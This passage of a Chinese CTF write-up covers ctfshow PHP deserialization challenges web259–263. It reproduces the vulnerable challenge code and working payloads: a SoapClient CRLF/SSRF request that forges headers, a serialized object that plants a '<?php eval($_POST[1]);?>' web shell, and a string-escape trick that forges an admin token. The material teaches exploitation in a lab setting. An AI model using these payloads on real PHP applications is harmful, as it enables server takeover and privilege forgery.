constant">3A</span><span class="token operator">+</span>application<span class="token operator">%</span>2Fx<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span><span class="token constant">0AX</span><span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">+</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">%</span><span class="token constant">2C127</span><span class="token number">.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">%</span><span class="token constant">2C127</span><span class="token number">.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">%</span><span class="token constant">2C127</span><span class="token number">.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">%</span><span class="token constant">2C127</span><span class="token number">.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span>0AUM_distinctid<span class="token operator">%</span>3A175648cc09a7ae<span class="token operator">-</span>050bc162c95347<span class="token number">-32667006</span><span class="token operator">-</span>13c680<span class="token operator">-</span>175648cc09b69d<span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span>0AContent<span class="token operator">-</span>Length<span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">+</span><span class="token number">13</span><span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span>0Atoken<span class="token operator">%</span>3Dctfshow<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A13</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22_soap_version<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bi<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这到题目中<code>$vip = unserialize($_GET[&#39;vip&#39;]);</code>也就就是<code>$vip = new SoapClient(n...,...)</code>，而当<code>$vip-&gt;getFlag();</code>时，也就是调用一个不存在的方法是，便将调用call魔术方法，也就是会调用SoapClient类的构造方法。</p><p>然后直接传参就可以了，然后访问flag.txt即可，题目非常好</p><h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ctfshow_i_love_36D/'</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctf</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string">'ctfshow_i_love_36D'</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//将在反序列化之后立即调用</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">!=</span><span class="token string">''</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//当尝试以调用函数的方式调用一个对象时</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//在对象被序列化之前运行</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php">如果类中同时定义了 <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 和 <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 两个魔术方法，则只有 <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法会生效，<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法会被忽略。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当反序列化时会进入<strong>unserialize中，而且也没有什么方法可以进入到</strong>invoke中。所以直接就朝着写文件搞就可以了。</p><pre class="line-numbers language-php"><code class="language-php">只要满足code<span class="token operator">==</span><span class="token function">0x36d</span><span class="token punctuation">(</span><span class="token number">877</span><span class="token punctuation">)</span>就可以了。而code是username和password拼接出来的。所以只要username<span class="token operator">=</span><span class="token number">877</span><span class="token punctuation">.</span>php password<span class="token operator">=</span>shell就可以了。<span class="token number">877</span><span class="token punctuation">.</span>php<span class="token operator">==</span><span class="token number">877</span>是成立的（弱类型比较）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token string">'877.php'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token string">'&lt;?php eval($_POST[1]);?>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//O:10:"ctfshowvip":3:{s:8:"username";s:7:"877.php";s:8:"password";s:24:"&lt;?php eval($_POST[1]);?>";s:4:"code";s:0:"";}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web262——反序列化字符串逃逸"><a href="#web262——反序列化字符串逃逸" class="headerlink" title="web262——反序列化字符串逃逸"></a>web262——反序列化字符串逃逸</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-03 02:37:19# @Last Modified by:   h1xa# @Last Modified time: 2020-12-03 16:05:38# @message.php# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'fuck'</span><span class="token punctuation">,</span> <span class="token string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$umsg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'Your message has been sent'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开message.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-03 15:13:03# @Last Modified by:   h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">==</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入的点在cookie的msg组</p><p>我们需要的样子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string">'2'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token operator">=</span><span class="token string">'3'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:1:"3";s:5:"token";s:5:"admin";}</span><span class="token comment" spellcheck="true">//O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:1:"3";s:5:"token";s:4:"user";}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是，在construct中是没有token的初始化的，而又不存在对象注入，所以只能利用字符串的缩短来实现替换token的值，可以看出来与上面相比是少了一个字符的，但是我们想要的效果是：</p><pre class="line-numbers language-php"><code class="language-php">将s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>插入到O<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"message"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"from"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"msg"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"to"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>中<span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string">'2'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token operator">=</span><span class="token string">'3";s:5:"token";s:5:"admin";}'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//多了27个字符</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:28:"3";s:5:"token";s:5:"admin";}";s:5:"token";s:4:"user";}</span>这样就欺骗的天衣无缝了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过这样的方式来实现欺骗，但是插入的部分</p><p>但是整条语句是存在逻辑问题的：</p><p>在<code>s:28:&quot;3&quot;;</code>这个地方，正常逻辑是3只有一个字符，但是却被标注为28个，那么在反序列化的时候，就会出现报错，但是此题在反序列化之前会对msg的参数进行替换操作，会将4个字符的fuck替换5个关字符的loveu，这样的话本来缺少的27个字符，就会被经过增加替换而多出来的27个字符顶替，正好满足136=109(love)+27(u)，而后面的27个字符也就顺理成章的替换了后面的token</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string">'2'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token operator">=</span><span class="token string">'3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//此处有27个fuck=109+27=136</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:136:"3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}";s:5:"token";s:4:"user";}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload：</strong></p><pre><code>?f=1&amp;m=2&amp;t=3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}</code></pre><p>然后访问message.php就可以得到flag</p><h1 id="web263——session反序列化"><a href="#web263——session反序列化" class="headerlink" title="web263——session反序列化"></a>web263——session反序列化</h1><p><a href="http://www.zip文件泄露，其中的**inc.php**文件存在file_put_contents危险函数：" target="_blank" rel="noopener">www.zip文件泄露，其中的**inc.php**文件存在file_put_contents危险函数：</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package"><span class="token punctuation">\</span>CTFSHOW<span class="token punctuation">\</span>CTFSHOW</span><span class="token punctuation">;</span> <span class="token keyword">require_once</span> <span class="token string">'CTFSHOW.php'</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CTFSHOW</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string">'database_type'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'mysql'</span><span class="token punctuation">,</span>    <span class="token string">'database_name'</span> <span class="token 